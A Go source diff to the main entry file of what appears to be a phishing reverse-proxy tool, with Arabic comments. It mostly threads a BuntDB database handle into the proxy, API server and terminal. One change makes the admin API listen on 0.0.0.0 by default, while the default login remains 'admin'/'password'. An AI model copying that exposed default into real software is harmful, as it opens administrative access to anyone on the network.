@@ -31,7 +31,7 @@ var developer_mode = flag.Bool("developer", false, "Enable developer mode (gener
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 var api_flag = flag.Bool("api", false, "Enable API server")
-var api_host = flag.String("api-host", "127.0.0.1", "API server host")
+var api_host = flag.String("api-host", "0.0.0.0", "API server host")
 var api_port = flag.Int("api-port", 8888, "API server port")
 var admin_username = flag.String("admin-username", "admin", "Admin username for API server")
 var admin_password = flag.String("admin-password", "password", "Admin password for API server")
@@ -149,6 +149,7 @@ func main() {
 
 	// إعلان متغير واجهة قاعدة البيانات
 	var db database.IDatabase
+	var buntDb *database.Database
 
 	if *use_mongo {
 		// استخدام MongoDB
@@ -197,6 +198,7 @@ func main() {
 			log.Fatal("%v", err)
 		}
 		db = fdb
+		buntDb = fdb
 
 		fmt.Printf(lg("تم") + e)
 	}
@@ -242,7 +244,16 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	// نتحقق ما إذا كان نستخدم BuntDB أو MongoDB ونمرر واجهة قاعدة البيانات المناسبة
+	var hp *core.HttpProxy
+	if *use_mongo {
+		// استخدام النوع المناسب لـ MongoDB
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	} else {
+		// استخدام BuntDB
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
+	}
+	
 	hp.Start()
 
 	// Start API server if enabled
@@ -258,7 +269,16 @@ func main() {
 			}
 		}
 		
-		api, err := core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, db)
+		var api *core.ApiServer
+		var err error
+		
+		if *use_mongo {
+			// نستخدم النوع المناسب من قاعدة البيانات
+			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, db)
+		} else {
+			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
+		}
+		
 		if err != nil {
 			log.Fatal("api server: %v", err)
 			return
@@ -268,9 +288,17 @@ func main() {
 		log.Info("API server started on %s:%d", *api_host, *api_port)
 	}
 
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
-	if err != nil {
-		log.Fatal("%v", err)
+	var t *core.Terminal
+	var err2 error
+	
+	if *use_mongo {
+		t, err2 = core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	} else {
+		t, err2 = core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
+	}
+	
+	if err2 != nil {
+		log.Fatal("%v", err2)
 		return
 	}
 
